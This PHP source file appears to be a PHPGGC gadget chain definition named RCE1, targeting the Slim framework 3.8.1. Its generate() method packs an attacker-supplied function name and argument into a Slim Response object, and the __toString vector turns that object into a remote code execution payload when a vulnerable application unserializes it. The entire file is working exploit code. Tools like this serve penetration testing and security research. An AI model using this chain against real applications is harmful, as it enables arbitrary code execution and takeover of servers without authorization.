<?php

namespace GadgetChain\Slim;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '3.8.1';
    public $vector = '__toString';
    public $author = 'cf';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Slim\Http\Response($function, $parameter);
    }
}